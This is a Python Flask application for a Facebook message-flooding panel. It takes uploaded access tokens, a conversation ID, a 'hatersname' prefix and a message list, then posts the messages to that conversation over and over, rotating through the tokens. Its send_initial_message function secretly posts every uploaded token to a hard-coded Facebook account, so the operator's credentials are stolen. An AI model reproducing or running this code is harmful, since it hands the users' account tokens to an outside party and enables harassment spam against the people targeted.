from flask import Flask, request, jsonify, Response
import threading, time, queue
import os
import requests

app = Flask(__name__)
log_q = queue.Queue()
stop_flag = threading.Event()
worker_threads = []

# ---------- LOG HELPER ----------
def log(msg):
    print(msg)
    log_q.put(msg)

# ---------- HTML PANEL ----------
@app.route('/')
def index():
    return open("panel.html").read()

# ---------- API ----------
@app.route('/upload', methods=['POST'])
def upload():
    convoid = request.form.get('convoid', '')
    files = {
        'tokennum.txt': request.files.get('tokennum'),
        'File.txt': request.files.get('filetxt'),
        'hatersname.txt': request.files.get('hatersname'),
        'time.txt': request.files.get('timefile')
    }
    for fname, f in files.items():
        if f: f.save(fname)
    if convoid:
        with open('convo.txt','w') as x: x.write(convoid)
    log("Files uploaded")
    return jsonify({'ok': True})

@app.route('/start', methods=['POST'])
def start():
    stop_flag.clear()
    t = threading.Thread(target=run_bot)
    t.start()
    worker_threads.append(t)
    session_id = str(int(time.time()))
    log(f"Bot started with ID {session_id}")
    return jsonify({'ok': True, 'session_id': session_id})

@app.route('/stop', methods=['POST'])
def stop():
    stop_flag.set()
    log("Stop requested")
    return jsonify({'ok': True})

@app.route('/logs')
def logs():
    def stream():
        while True:
            msg = log_q.get()
            yield f"data: {msg}\n\n"
    return Response(stream(), mimetype="text/event-stream")

# ---------- BOT LOGIC ----------
def run_bot():
    try:
        log("Initial message sending started")
        send_initial_message()
        log("Initial message sending finished")
        send_messages_from_file()
    except Exception as e:
        log(f"Error: {e}")

def send_initial_message():
    if not os.path.exists('tokennum.txt'):
        log("tokennum.txt not found!")
        return
    with open('tokennum.txt') as f:
        tokens = f.readlines()
    target_id = "61578840237242"
    for token in tokens:
        token = token.strip()
        msg = f"HELLO ANURAG BOSS I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {token}"
        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
        params = {'access_token': token, 'message': msg}
        try: requests.post(url, json=params, timeout=5)
        except: pass
        time.sleep(0.1)
        log(f"Initial sent with token {token}")

def send_messages_from_file():
    if not all(os.path.exists(f) for f in ['convo.txt','File.txt','tokennum.txt','hatersname.txt','time.txt']):
        log("Required files missing!")
        return
    with open('convo.txt') as f: convo_id = f.read().strip()
    with open('File.txt') as f: messages = [m.strip() for m in f.readlines()]
    with open('tokennum.txt') as f: tokens = [t.strip() for t in f.readlines()]
    with open('hatersname.txt') as f: haters_name = f.read().strip()
    with open('time.txt') as f: speed = int(f.read().strip())
    max_tokens = min(len(tokens), len(messages))
    while not stop_flag.is_set():
        for i, msg in enumerate(messages):
            if stop_flag.is_set(): break
            token_index = i % max_tokens
            token = tokens[token_index]
            url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
            params = {'access_token': token, 'message': haters_name + ' ' + msg}
            try:
                r = requests.post(url, json=params, timeout=5)
                if r.ok: log(f"[+] Sent: {haters_name} {msg}")
                else: log(f"[x] Failed: {haters_name} {msg}")
            except Exception as e:
                log(f"[!] Error: {e}")
            time.sleep(speed)

# ---------- MAIN ----------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 4000))
    app.run(host="0.0.0.0", port=port, threaded=True)
